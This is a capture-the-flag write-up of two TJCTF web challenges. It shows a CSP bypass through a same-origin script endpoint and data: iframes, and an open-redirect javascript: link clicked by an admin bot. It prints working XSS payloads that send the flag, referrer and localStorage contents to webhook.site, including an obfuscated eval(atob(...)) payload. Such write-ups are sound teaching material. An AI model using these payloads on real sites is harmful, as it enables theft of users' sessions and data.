---
title: "TJCTF - XSS"
summary: "Just a Walkthrough of XSS challenge of TJCTF"
date: "June 9 2025"
draft: false
tags:
  - Web
---

---

## Table of Contents

1.[Double-Nested XSS](#double-nested-xss)

2.[Markdown - Renderer](#markdown---renderer)

---

## Double-Nested XSS

We are presented with a web challenge involving **three primary components**:

- `index.html` – the frontend of the challenge
    
- `app.py` – the backend logic
    
- `admin-bot.js` – the behavior of the bot visiting the page
    

Our objective is clear: **achieve a functional XSS and extract the flag** being passed to the bot.

---

###  Content Security Policy (CSP) Overview

The CSP header in `index.html` is strict:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'none'; object-src 'none'; frame-src data:; manifest-src 'none';
```

**Observations:**

- `script-src 'self'`: only same-origin scripts are allowed.
    
- No `'unsafe-inline'`: inline scripts like `<script>alert(1)</script>` are blocked.
    
- `frame-src data:`: allows usage of `iframe` with a `data:` URL.
    
- All other sources (e.g., `img`, `object`) are locked down.
    

---

### Backend Sanitization (app.py)

```python
def sanitize(input):
    input = re.sub(r"^(.*?=){,3}", "", input)
    forbidden = ["script", "http://", "&", "document", '"']

    if any([i in input.lower() for i in forbidden]) or len([i for i in range(len(input)) if input[i:i+2].lower()=="on"]) != len([i for i in range(len(input)) if input[i:i+8].lower()=="location"]):
        return 'Forbidden!'

    return input
```

**Key Takeaways:**

- The first **3 ********************************************************`key=value`******************************************************** pairs** are stripped.
    
- Forbidden substrings: "script", "http://", "&", "document", '"'.
    
- Complex check: number of "on" occurrences must equal "location" — a naive attempt to block event handlers like onerror, onload, etc.
    

---

### javaScript Execution Strategy

We find a helpful backend endpoint:

```python
@app.route('/gen')
def gen():
	query = sanitize(request.args.get("query", ""))
	return query, 200, {'Content-Type': 'application/javascript'}
```

This `/gen` endpoint:

- Accepts `query` as input
    
- Returns it directly with `Content-Type: application/javascript`
    

###  Exploit Pathway:

Since inline `<script>` tags are blocked by CSP, but scripts from `'self'` are allowed, we can **inject external javaScript** from `/gen`.

---

###  XSS via Iframe & base64

### Step 1: Payload to execute `alert(1)` via `/gen`

```html
<script src="https://double-nested.tjc.tf/gen?query=1=1=1=alert(1)"></script>
```

To deliver this script inside an iframe with `data:` URI, we base64 encode:

```html
<iframe src="data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8vZG91YmxlLW5lc3RlZC50amMudGYvZ2VuP3F1ZXJ5PTE9MT0xPWFsZXJ0JTI4MSUyOSI+PC9zY3JpcHQ+"></iframe>
```

Now, we **wrap this iframe into a reflected parameter**:

### Final URL Payload (urlencoded with 3 dummy key-value pairs):

```js
/?i=1%3D1%3D1%3D%3Ciframe%20src%3D%27data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdCBzcmM9Imh0dHBzOi8vZG91YmxlLW5lc3RlZC50amMudGYvZ2VuP3F1ZXJ5PTE9MT0xPWFsZXJ0JTI4MSUyOSI%2BPC9zY3JpcHQ%2B%27%3E%3C%2Fiframe%3E
```

 **XSS Achieved** – `alert(1)` is executed.

---

###  Flag Extraction Strategy

From `admin-bot.js`:

```js
await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
```

**Implication**: When the admin bot visits our crafted payload, it appends the `flag` directly to the URL.

---

####  Method 1: Referrer Leak via `top.location`

**javaScript Payload:**

```js
top.location = 'https://webhook.site/your-id/?i=' + window['doc' + 'ument'].referrer
```

This sends the **full URL (including flag)** to an external domain by leveraging the iframe’s `referrer`.

>The iframe’s document has access to the `document.referrer`, which contains the URL of the parent window , Since the flag is appended to that URL, we can extract it from the referrer.

By appending the `document.referrer` to a request to our server and setting `top.location`, we redirect the top-level window (containing the flag) to our malicious endpoint.

PS: `top.location` refers to the URL of the top-most window — that is, the main page that contains the iframe.

##### Encapsulated Script:

```html
<script src="https://double-nested.tjc.tf/gen?query=1=1=1=top.location='https://webhook.site/your-id/?i='+window['doc'+'ument'].referrer"></script>
```

**Encoded iframe**:

```html
<iframe referrerpolicy='unsafe-url' src='data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8vZG91YmxlLW5lc3RlZC50am... (base64 content)'></iframe>
```

Payload gets reflected, iframe loads JS, JS reads `document.referrer` (which contains the flag) and **redirects top window**, thus exfiltrating the flag.

**Why** `**referrerpolicy='unsafe-url'**`**?**

Normally, iframes do not send the full referrer when navigating cross-origin, especially if using `data:` URLs. Browsers strip sensitive components (like query strings) by default.

By setting `referrerpolicy='unsafe-url'`, we explicitly instruct the browser to send the **complete referring URL**, including the origin, path, and query parameters — which is essential for capturing the flag.

> Reference: [MDN - iframe referrerpolicy](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#referrerpolicy)

---

#### Method 2: Using `window.name` (also appended by admin bot)

From the behavior:

```js
<iframe src='data:text/html;base64,.......' name= <bot_append_flag_here>
```

If the bot appends the flag to `name`, we can use `self.name` to extract it.

**JS Payload:**

```js
window.open('https://webhook.site/your-id?flag=' + self.name)
```

**Final iframe:**

```html
<iframe src='data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8vZG91YmxlLW5lc3RlZC50am... (base64 content)' name=
```

---

## Markdown - Renderer


### Files Overview

We are given three primary files in this challenge:

- `index.html`
    
- `register.html`
    
- `markdown.html`
	
- `app.py`
---

###  `register.html` – Open Redirection Vulnerability

```js
const urlParams = new URLSearchParams(window.location.search);
window.location.href = urlParams.get('redirect') ?? '/';
```

The code above introduces a classic **open redirection vulnerability**. The `redirect` parameter is taken directly from the query string and the browser is redirected to its value, without validation or sanitization.

---

###  `index.html` – Redirection Trigger

```js
window.location.href = '/register?redirect=' + encodeURIComponent(window.location.href);
```

This snippet automatically redirects users to the `register.html` page, passing the current page’s URL as the `redirect` parameter.

---

### `markdown.html` – DOMPurify Protection

```js
const clean = DOMPurify.sanitize(marked.parse(content), { USE_PROFILES: { html: true } });
```

Here, the `markdown` content is sanitized using [DOMPurify](https://github.com/cure53/DOMPurify) version 3.2.6 — the latest version at the time — using the HTML profile. This means that while dangerous content like scripts are sanitized, basic HTML tags are still allowed.

---

###  What Does `admin-bot.js` Do?

```js
// Register the admin user
await page.goto('https://markdown-renderer.tjc.tf/register', { timeout: 3000, waitUntil: 'domcontentloaded' });
await page.type('#username', 'admin');
await page.click('button[type="submit"]');
await sleep(1000);

// Make new markdown file
await page.type('#markdown', `# facts about me\ni love flags! (\`${flag.trim()}\`)\ni'm super locked in...`);
await page.click('#renderButton');
await sleep(1000);

// Go to your markdown file
await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' });
await sleep(1000);

// Open my own markdown file (better than yours)
await page.click(`#markdownList>li>a`);
```

#### Summary of Bot Behavior

- Types `admin` in the `#username` field and submits the form.
    
- Types a markdown string containing the flag and clicks `#renderButton`.
    
- Navigates to a user-controlled URL (`url`).
    
- Then clicks the first link inside `#markdownList > li > a`.
    

---

###  Backend API (app.py)

```python
@app.route('/render', methods=['POST'])
def render_markdown():
    ...
    return {'markdown_id': markdown_id}, 201

@app.route('/markdown/<markdown_id>')
def get_markdown(markdown_id):
    ...
    return render_template('markdown.html', markdownId=markdown_id)

@app.route('/markdown/<markdown_id>/details')
def get_markdown_details(markdown_id):
    ...
    return {'content': markdown['content'], 'author': markdown['author']}

@app.route('/user/<user_id>')
def get_user_markdowns(user_id):
    ...
```

#### Key Observations

- **No authentication or authorization** checks are in place to view markdowns or user markdowns.
    
- If you know the `user_id` or `markdown_id`, you can access the data.
    

---

###  Payload Creation

```html
<ul id="markdownList">
    <li><a href={payload}>CLICK</a></li>
</ul>
```

Since the bot clicks the first anchor tag inside `#markdownList`, we can inject our own link. In the Markdown . This enables **javaScript execution** using the open redirection flaw.

We exploit this by crafting a Pseudo Protocol  `javascript:`  with a base64 payload. This avoids issues with special characters and encoding.

---

### Goal: Exfiltrate `localStorage`

No Way of Stealing the flag directly, we aim to extract sensitive data stored in the browser’s `localStorage`, which includes:

- `user_id`
    
- `markdown_id`


Then, exfiltrate the data using a webhook:

```js
location.href="https://webhook.site/6baaec6d-cfa1-4539-9e6f-992e76ca95e0/?p="+JSON.stringify(localStorage)
```

We encode this in base64 and wrap it in an `eval(atob(...))` call:

```js
javascript:eval(atob('{payload}'))
```

---

###  Final Exploit Payload

```html
<ul id="markdownList">
    <li><a href="https://markdown-renderer.tjc.tf/register?redirect=javascript%3Aeval%28atob%28%27bG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93ZWJob29rLnNpdGUvNmJhYWVjNmQtY2ZhMS00NTM5LTllNmYtOTkyZTc2Y2E5NWUwLz9wPSIrSlNPTi5zdHJpbmdpZnkobG9jYWxTdG9yYWdlKQo%27%29%29" target="_blank">CLICK</a></li>
</ul>
```

When the bot visits this page and clicks the link, it gets redirected using the vulnerable `register.html`, triggering our javaScript which sends `localStorage` contents to our webhook.

Using the `markdown_id` retrieved from this data, we can then fetch the flag via:

```
GET /markdown/<markdown_id>/details
```

---
